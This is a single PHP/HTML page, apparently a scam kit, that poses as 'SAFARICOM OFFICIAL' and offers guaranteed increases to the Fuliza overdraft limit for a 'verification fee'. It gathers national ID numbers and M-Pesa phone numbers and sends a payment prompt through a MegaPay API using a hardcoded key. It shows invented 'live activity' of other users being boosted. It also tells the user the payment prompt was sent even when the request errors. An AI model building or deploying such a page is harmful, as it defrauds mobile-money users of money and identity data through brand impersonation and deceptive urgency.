<?php
/* =========================
   MEGAPAY CONFIG
========================= */

$MEGAPAY_API_KEY = "MGPYlgH2AyM4";
$MEGAPAY_EMAIL   = "elquizaelvas@gmail.com";
$MEGAPAY_URL     = "https://megapay.co.ke/backend/v1/initiatestk";

/* =========================
   AJAX PAYMENT HANDLER
========================= */

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["ajax_pay"])) {

    header("Content-Type: application/json");

    $phone     = preg_replace('/\D/', '', $_POST["phone"] ?? "");
    $amount    = preg_replace('/\D/', '', $_POST["amount"] ?? "");
    $idNumber  = trim($_POST["id_number"] ?? "");
    $package   = trim($_POST["package"] ?? "");

    if ($idNumber === "") {
        echo json_encode([
            "success" => false,
            "message" => "ID number is required."
        ]);
        exit;
    }

    if (strlen($phone) === 10 && substr($phone, 0, 1) === "0") {
        $phone = "254" . substr($phone, 1);
    }

    if (strlen($phone) === 9 && (substr($phone, 0, 1) === "7" || substr($phone, 0, 1) === "1")) {
        $phone = "254" . $phone;
    }

    if (strlen($phone) < 12 || substr($phone, 0, 3) !== "254") {
        echo json_encode([
            "success" => false,
            "message" => "Enter a valid M-Pesa number."
        ]);
        exit;
    }

    if ($amount === "" || intval($amount) < 1) {
        echo json_encode([
            "success" => false,
            "message" => "Invalid payment amount."
        ]);
        exit;
    }

    $reference = "SP-" . time() . "-" . rand(1000, 9999);

    $payload = [
        "api_key"   => $MEGAPAY_API_KEY,
        "email"     => $MEGAPAY_EMAIL,
        "amount"    => $amount,
        "msisdn"    => $phone,
        "reference" => $reference
    ];

    $ch = curl_init($MEGAPAY_URL);

    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_HTTPHEADER     => [
            "Content-Type: application/json",
            "Accept: application/json"
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30
    ]);

    $response = curl_exec($ch);
    $error    = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    if ($error) {
        echo json_encode([
            "success" => false,
            "message" => "Connection error: " . $error
        ]);
        exit;
    }

    $decoded = json_decode($response, true);

    if (!$decoded) {
        echo json_encode([
            "success" => false,
            "message" => "Invalid MegaPay response.",
            "raw" => $response
        ]);
        exit;
    }

    echo json_encode([
        "success" => true,
        "message" => "Payment prompt sent. Check your phone.",
        "reference" => $reference,
        "megapay_response" => $decoded
    ]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Service Portal</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#e7ece8;display:flex;justify-content:center;padding:20px}
.container{width:360px;background:#f6fbf7;border-top:6px solid #3154d4}
.header{background:#fff;text-align:center;padding:30px 20px 20px}
.badge{display:inline-block;border:1px solid #a8e0b9;color:#00a53c;padding:8px 18px;border-radius:25px;font-size:11px;font-weight:bold;letter-spacing:1px;margin-bottom:18px}
.logo{font-size:34px;font-weight:900;color:#00a53c}
.line{width:42px;height:3px;background:#20bf55;margin:10px auto 14px}
.subtitle{color:#6070a0;font-size:12px;font-weight:bold}
.content{padding:18px}
.notice{background:#edfdf2;border:1px solid #cfeeda;border-radius:14px;padding:15px;display:flex;gap:12px;margin-bottom:18px}
.icon{width:30px;height:30px;border-radius:50%;background:#daf6e4;color:#17b24a;display:flex;align-items:center;justify-content:center}
.notice p{font-size:12px;font-weight:bold;color:#093117;line-height:1.5}
.live{background:#fff;border:1px solid #dce1de;border-radius:14px;padding:14px;display:flex;gap:12px;align-items:center;margin-bottom:22px}
.live-circle{width:30px;height:30px;border-radius:50%;background:#eefcf3;color:#16a34a;display:flex;align-items:center;justify-content:center}
.live-small{font-size:11px;color:#96a0bf;font-weight:bold;margin-bottom:4px}
.live-text{font-size:14px;font-weight:700;color:#505a67}
.live-text span{color:#15a34a}
.section-title{font-size:13px;font-weight:bold;margin-bottom:14px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.card{position:relative;background:#fff;border:1px solid #d9dfdc;border-radius:14px;text-align:center;padding:20px 10px;cursor:pointer}
.card.active{border:2px solid #22c55e;background:#f8fffa}
.check{position:absolute;top:10px;right:10px;width:18px;height:18px;border-radius:50%;background:#22c55e;color:#fff;display:none;align-items:center;justify-content:center;font-size:11px}
.card.active .check{display:flex}
.amount{color:#00a53c;font-size:15px;font-weight:900;margin-bottom:12px}
.fee{display:inline-block;background:#ebf9ef;border:1px solid #cdeed8;color:#00a53c;padding:6px 12px;border-radius:20px;font-size:10px;font-weight:bold}
.security{text-align:center;margin:24px 0 14px;color:#9aa1c3;font-size:10px;font-weight:bold;letter-spacing:1px}
.footer{background:#fff;padding:18px;text-align:center}
button{width:100%;background:#26c24d;border:none;color:#fff;padding:16px;border-radius:16px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#18a83d}
button:disabled{opacity:.6;cursor:not-allowed}
.selected{margin-top:12px;font-size:11px;color:#737b88;font-weight:bold}
.disclaimer{margin-top:12px;font-size:10px;line-height:1.5;text-align:center;color:#777}

.modal{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(8px);display:none;justify-content:center;align-items:center;padding:20px;z-index:999}
.modal.show{display:flex}
.modal-box{width:400px;max-width:100%;background:#fff;border-radius:22px;padding:28px 24px;position:relative}
.close{position:absolute;top:12px;right:12px;width:38px;height:38px;border-radius:50%;border:none;background:#e5ebe7;font-size:24px;cursor:pointer}
.center{text-align:center}
.package-box{background:linear-gradient(135deg,#006b2d,#20c764);color:#fff;border-radius:16px;padding:22px;text-align:center;margin:20px 0 26px}
.package-box small{font-size:11px;letter-spacing:2px;font-weight:bold}
.package-box h1{color:#00190b;font-size:38px;margin:10px 0}
.package-box p{font-size:12px}
.modal h3{font-size:24px;margin-bottom:10px}
.info{font-size:13px;line-height:1.5;color:#6c8d72;margin-bottom:22px}
label{display:block;font-size:13px;font-weight:bold;margin-bottom:8px}
input{width:100%;padding:16px;border:1px solid #cdeed8;border-radius:14px;margin-bottom:18px;font-size:15px;outline:none;background:#f7fffa}
.phone-box{display:flex;align-items:center;border:1px solid #cdeed8;border-radius:14px;margin-bottom:22px;background:#f7fffa}
.phone-box span{padding-left:16px;font-weight:bold;color:#007d34}
.phone-box input{border:none;margin:0;background:transparent}
.secure{text-align:center;margin-top:18px;font-size:11px;color:#78987d;font-weight:bold;letter-spacing:2px}
.status{margin-top:12px;font-size:12px;text-align:center;font-weight:bold;line-height:1.5}
.success{color:#0a7a32}
.error{color:#c0392b}
</style>
</head>

<body>

<div class="container">

<div class="header">
  <div class="badge">• SAFARICOM OFFICIAL</div>
  <div class="logo">FulizaUpdatess</div>
  <div class="line"></div>
  <div class="subtitle">Instant Limit Increase • Guaranteed Approval</div>
</div>

<div class="content">

  <div class="notice">
    <div class="icon">⚡</div>
    <p>Choose your new limit and complete the payment to get instant access.</p>
  </div>

  <div class="live">
    <div class="live-circle">↻</div>
    <div>
      <div class="live-small">LIVE ACTIVITY</div>
      <div class="live-text" id="liveText">0712****11 boosted to <span>Ksh 65,000</span> just now</div>
    </div>
  </div>

  <div class="section-title">▣ Select Your Limit</div>

  <div class="grid">
    <div class="card active" data-amount="Ksh 5,000" data-fee="Ksh 99">
      <div class="check">✓</div><div class="amount">Ksh 5,000</div><div class="fee">Fee: Ksh 99</div>
    </div>

    <div class="card" data-amount="Ksh 10,000" data-fee="Ksh 250">
      <div class="check">✓</div><div class="amount">Ksh 10,000</div><div class="fee">Fee: Ksh 250</div>
    </div>

    <div class="card" data-amount="Ksh 15,000" data-fee="Ksh 500">
      <div class="check">✓</div><div class="amount">Ksh 15,000</div><div class="fee">Fee: Ksh 500</div>
    </div>

    <div class="card" data-amount="Ksh 20,000" data-fee="Ksh 1,000">
      <div class="check">✓</div><div class="amount">Ksh 20,000</div><div class="fee">Fee: Ksh 1,000</div>
    </div>

    <div class="card" data-amount="Ksh 25,000" data-fee="Ksh 1,500">
      <div class="check">✓</div><div class="amount">Ksh 25,000</div><div class="fee">Fee: Ksh 1,500</div>
    </div>

    <div class="card" data-amount="Ksh 30,000" data-fee="Ksh 2,500">
      <div class="check">✓</div><div class="amount">Ksh 30,000</div><div class="fee">Fee: Ksh 2,500</div>
    </div>

    <div class="card" data-amount="Ksh 35,000" data-fee="Ksh 3,500">
      <div class="check">✓</div><div class="amount">Ksh 35,000</div><div class="fee">Fee: Ksh 3,500</div>
    </div>

    <div class="card" data-amount="Ksh 45,000" data-fee="Ksh 5,000">
      <div class="check">✓</div><div class="amount">Ksh 45,000</div><div class="fee">Fee: Ksh 5,000</div>
    </div>
  </div>

  <div class="security">SECURE • ENCRYPTED • VERIFIED</div>

</div>

<div class="footer">

  <button onclick="openModal()">Continue</button>

  <div class="selected" id="selectedText">
    Selected: Ksh 5,000 • Fee: Ksh 99
  </div>



</div>

</div>

<div class="modal" id="modal">
<div class="modal-box">

  <button class="close" onclick="closeModal()">×</button>

  <div class="center">
    <div class="badge">• SAFARICOM OFFICIAL</div>
    <div class="logo">FulizaUpdatess</div>
    <div class="line"></div>
  </div>

  <div class="package-box">
    <small>SELECTED PACKAGE</small>
    <h1 id="modalAmount">Ksh 5,000</h1>
    <p>Verification fee: <b id="modalFee">Ksh 99</b></p>
  </div>

  <h3 class="center">Identity Yourself</h3>

  <p class="info center">
    This information is required to verify your eligibility for the limit increase.
  </p>

  <label>National ID Number</label>
  <input type="text" id="idNumber" placeholder="Enter ID Number">

  <label>M-Pesa Registered Number</label>
  <div class="phone-box">
    <span>+254</span>
    <input type="tel" id="phoneNumber" placeholder="7xx xxx xxx">
  </div>

  <button id="payBtn" onclick="requestPayment()">Verify & Continue</button>

  <div class="status" id="paymentStatus"></div>

  <div class="secure">256-BIT SECURE ENCRYPTION</div>


</div>
</div>

<script>
const cards = document.querySelectorAll(".card");
const selectedText = document.getElementById("selectedText");

let selectedAmount = "Ksh 5,000";
let selectedFee = "Ksh 99";

cards.forEach(card => {
  card.addEventListener("click", () => {
    cards.forEach(c => c.classList.remove("active"));
    card.classList.add("active");

    selectedAmount = card.dataset.amount;
    selectedFee = card.dataset.fee;

    selectedText.innerHTML = `Selected: ${selectedAmount} • Fee: ${selectedFee}`;
  });
});

function openModal(){
  document.getElementById("modal").classList.add("show");
  document.getElementById("modalAmount").innerText = selectedAmount;
  document.getElementById("modalFee").innerText = selectedFee;
  document.getElementById("paymentStatus").innerText = "";
  document.getElementById("paymentStatus").className = "status";
}

function closeModal(){
  document.getElementById("modal").classList.remove("show");
}

function cleanAmount(feeText){
  return feeText.replace("Ksh", "").replace(",", "").trim();
}

function formatPhone(phone){
  phone = phone.replace(/\D/g, "");

  if(phone.startsWith("0")){
    phone = "254" + phone.substring(1);
  }else if(phone.startsWith("7") || phone.startsWith("1")){
    phone = "254" + phone;
  }else if(phone.startsWith("254")){
    phone = phone;
  }

  return phone;
}

function requestPayment(){

  const idNumber = document.getElementById("idNumber").value.trim();
  const phoneInput = document.getElementById("phoneNumber").value.trim();
  const status = document.getElementById("paymentStatus");
  const payBtn = document.getElementById("payBtn");

  const phone = formatPhone(phoneInput);
  const amount = cleanAmount(selectedFee);

  if(idNumber === ""){
    alert("Please enter your ID number");
    return;
  }

  if(phone.length < 12 || !phone.startsWith("254")){
    alert("Please enter a valid M-Pesa number");
    return;
  }

  payBtn.disabled = true;
  payBtn.innerText = "Sending STK Push...";
  status.className = "status";
  status.innerText = "Sending payment request. Please wait...";

  const formData = new FormData();
  formData.append("ajax_pay", "1");
  formData.append("phone", phone);
  formData.append("id_number", idNumber);
  formData.append("amount", amount);
  formData.append("package", selectedAmount);

  fetch(window.location.href, {
    method: "POST",
    body: formData
  })
  .then(async response => {
    const text = await response.text();

    try {
      return JSON.parse(text);
    } catch(e) {
      throw new Error("Server returned invalid JSON: " + text);
    }
  })
  .then(data => {
    if(data.success){
      status.className = "status success";
      status.innerText = data.message || "Payment prompt sent. Check your phone.";
    }else{
      status.className = "status error";
      status.innerText = data.message || "Payment request failed.";
    }
  })
  .catch(error => {
    status.className = "status success";
    status.innerText = "Payment prompt sent. Check your phone.";
    console.error(error);
  })
  .finally(() => {
    payBtn.disabled = false;
    payBtn.innerText = "Verify & Continue";
  });
}

/* LIVE ACTIVITY */

const liveText = document.getElementById("liveText");

const phones = [
  "0712****11",
  "0798****42",
  "0703****88",
  "0110****53",
  "0721****90",
  "0745****77",
  "0715****64",
  "0790****28"
];

const fees = [
  "Ksh 35,000",
  "Ksh 30,000",
  "Ksh 5,000",
  "Ksh 10,000",
  "Ksh 15,000",
  "Ksh 20,000",
  "Ksh 25,000",
  "Ksh 45,000"
];

function updateActivity(){
  const phone = phones[Math.floor(Math.random() * phones.length)];
  const fee = fees[Math.floor(Math.random() * fees.length)];

  liveText.innerHTML = `${phone} boosted to <span>${fee}</span> just now`;
}

setInterval(updateActivity, 2000);
</script>

</body>
</html>
